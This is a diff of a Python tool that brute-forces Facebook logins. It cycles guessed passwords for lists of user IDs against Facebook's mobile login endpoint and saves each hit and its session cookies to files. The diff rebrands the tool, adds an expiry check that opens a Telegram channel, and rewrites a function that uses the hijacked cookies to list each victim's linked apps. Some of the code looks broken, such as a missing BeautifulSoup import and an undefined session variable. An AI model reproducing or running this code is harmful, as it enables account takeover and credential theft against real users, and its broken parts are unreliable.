@@ -2,6 +2,32 @@ import os
 import sys
 import time
 import requests,bs4,json,os,sys,random,datetime,time,re
+from datetime import *
+def stoped(y=0,m=0,d=0):
+ date = datetime.now()
+ if len(list(str(y))) == 4:
+  if m <= 11 and m > 0:
+   if d <= 6 and d > 0:
+    if date.year <= y:
+     if date.month <= m:
+      if date.day < d:
+       return True
+x = stoped(2024,3,17)
+os.system('xdg-open  https://t.me/KILLER_CRAaCKER')
+if x:pass
+else:quit('This tool hass ben expired')
+os.system('xdg-open  https://t.me/KILLER_CRAaCKER')
+print("TOLL WORKING @l4m_rawa")
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip install requests")
+
+try:
+	import concurrent.futures
+except ImportError:
+	os.system("pip install futures")
 import urllib3,rich,base64,uuid
 from rich.table import Table as me
 from rich.console import Console as sol
@@ -148,7 +174,7 @@ def banner():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠈⠻⣿⣿⣿⡇⠀⠸⣷⡀⢿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠈⠙⠿⣿⡄⠀⠘⢿⣦⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⡀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀VERSION 1.1🦁⠀                                                               
+⠀⠀⠀                                                               
 
 """)
 
@@ -204,11 +230,11 @@ def setting():
 	banner()
 	print('')
 	print('')
-	pwplus=input(f' \x1b[38;5;98mPASSWORDE XERA💓 [ Y/n ] = ')
+	pwplus=input(f' \x1b[38;5;98m𝐀𝐔𝐓𝐎 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 [ Y/n ] = ')
 	print('')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		pwku=input(f' \x1b[38;5;98mHAMU PASSWORDAKAN💖 [ Y/n ] = ')
+		pwku=input(f' \x1b[38;5;98m𝐀𝐔𝐓𝐎 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 [ Y/n ] = ')
 		print('')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
@@ -286,7 +312,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r \033[1;37mRAWA-B-API🦅 {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93m\033[1;90m 👉 \033[1;92m{ok}\033[1;90m-\033[1;93m  "),
+	sys.stdout.write(f"\r \033[1;37m𝐑𝐀𝐖𝐀 🔥 {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -343,7 +369,7 @@ def crack(idf,pwv):
 }
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r\033[1;37m[TANYA-\033[1;93mCP\033[1;37m] \033[1;93m {idf} | {pw}')
+				print(f'\r\033[1;37m[RAWA-\033[1;93mCP\033[1;37m] \033[1;93m {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -354,7 +380,7 @@ def crack(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r\x1b[32[RAWA-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
 				open('/storage/emulated/0/TANYA-OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				cek_SURCHY(kuki)
+				cek_apk(session,coki)
 				break
 			else:
 				continue
@@ -363,7 +389,7 @@ def crack(idf,pwv):
 	loop+=1
 def crackfree(idf,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r \033[1;37mTANYA = {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
+	sys.stdout.write(f"\r \033[1;37mRAWA = {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -377,7 +403,7 @@ def crackfree(idf,pwv):
 			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://developers.facebook.com/tools/debug/accesstoken/'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r\033[1;37m[TANYA-\033[1;93mCP\033[1;37m] \033[1;93m {idf} | {pw}')
+				print(f'\r\033[1;37m[RAWA-\033[1;93mCP\033[1;37m] \033[1;93m {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -386,7 +412,7 @@ def crackfree(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\033[1;37m[TANYA-\033[1;92mOK\033[1;37m] \033[1;92m {idf} | {pw}')
+				print(f'\r\033[1;37m[RAWA-\033[1;92mOK\033[1;37m] \033[1;92m {idf} | {pw}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(session,coki)
 				break
@@ -485,26 +511,25 @@ def cek_opsi():
 	sol().print(mark(dah, style='green'))
 	exit()
 #----------------------[ CEK-APLIKASI ]---------------------#
-def cek_SURCHY(kuki):
- session = requests.Session()
- w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
- sop = bs4.BeautifulSoup(w,"html.parser")
- x = sop.find("form",method="post")
- game = [i.text for i in x.find_all("h3")]
- try:
-  for i in range(len(game)):
-   print ("\r%s  \033[0m  %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
- except AttributeError:
-  print ("\r    %s\033[0m cookie invalid"%(M))
- w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
- sop = bs4.BeautifulSoup(w,"html.parser")
- x = sop.find("form",method="post")
- game = [i.text for i in x.find_all("h3")]
- try:
-  for i in range(len(game)):
-   print ("\r%s  \033[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
- except AttributeError:
-  print ("\r    %s \033[0mcookie invalid"%(M))
+def cek_apk(session,cookie):
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\n.")
+	else:
+		for i in range(len(game)):
+			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\n")
+	else:
+		for i in range(len(game)):
+			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
 
 if __name__=='__main__':
 	try:os.system('git pull')
